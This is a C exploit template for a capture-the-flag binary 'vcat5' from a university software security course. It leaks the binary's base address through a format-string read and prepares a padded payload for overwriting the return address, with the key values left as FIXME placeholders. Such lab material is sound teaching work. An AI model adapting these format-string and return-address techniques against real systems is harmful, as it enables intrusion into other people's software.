/*
 * CTF-2 `vcat5' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <sys/stat.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define	MAX_VAL		0xF0000000UL
#define	BUF_SZ		sizeof("0x00000000")
#define	FMT_STR		"%22$x"	/* FIXME	*/
#define BIN_BASE_OFF	0x0		/* FIXME	*/

// To leak return address: %22$x (which has offset 0x15c4 from the start of the file)


unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	"\xef\xbe\xad\xde";
	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/* scratch space			*/
	char		buf[BUF_SZ];

	/* base address of `vcat5'		*/
	unsigned long	baddr;

	/* helper				*/
	struct stat	istat;

	/* cleanup				*/
	memset(buf, 0, BUF_SZ);

	/* leak the base address of `vcat5'	*/
	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
	read(STDIN_FILENO, buf, BUF_SZ-1);
	write(STDOUT_FILENO, buf, BUF_SZ-1);
	baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;

	/* sanity check 			*/
	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
		if (!baddr || baddr > MAX_VAL) {
			fprintf(stderr,
				"[-] baddr = 0x%08lx\n", baddr);
			fprintf(stderr,
				"[!] If you are debugging your exploit under GDB "
				"you need to type in the leaked address\n");
		}
	}

	/* fix the payload			*/
	/* FIXME				*/

	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	//write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success			*/
	return EXIT_SUCCESS;
}
